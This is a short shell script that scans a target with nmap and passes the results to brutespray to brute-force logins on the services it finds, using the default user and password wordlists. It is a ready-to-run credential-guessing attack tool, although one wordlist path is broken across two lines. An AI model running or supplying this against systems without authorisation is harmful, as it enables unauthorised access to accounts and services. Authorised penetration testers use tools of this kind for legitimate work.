#!/bin/sh

FILE="scan.gnmap"

[ -z "$1" ] && {
	printf "usage: $0 <target>\n";
	exit 1;
}

fscan() {
	nmap -sS -sV $1 -vv -n -oA $FILE
}

fspray() {
	USR="/usr/share/brutespray/wordlist/user.txt"
	PASS="/usr/share/brutespray/wordlist/
pass.txt"
	brutespray \
		--file "$FILE" \
		-U "$USR" \
		-P "$PASS" \
		--threads 5 \
		--hosts 5
}

{ fscan && fspray && exit 0; } || printf "something's wrong in here somewhere...\n" 
